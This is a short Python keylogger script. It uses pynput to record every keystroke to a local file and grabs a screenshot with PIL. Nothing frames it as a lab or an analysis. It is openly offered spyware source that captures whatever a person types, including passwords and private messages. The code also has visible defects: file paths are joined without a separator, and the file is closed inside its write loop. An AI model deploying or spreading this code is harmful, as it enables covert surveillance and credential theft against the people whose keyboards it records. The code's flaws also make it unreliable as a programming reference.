# Keylogger
from pynput.keyboard import Key, Listener

from PIL import ImageGrab
keys_information = "key_log.txt"
screenshot_information = "screenshot.png"

file_path = "/root/PycharmProjects/pythonProject/.venv"

count = 0
keys = []
# get screenshots
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + screenshot_information)

screenshot()

def on_press(key):
    global keys, count

    print(key)
    keys.append(key)
    count += 1


    if count >= 1:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open(file_path +  keys_information, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()








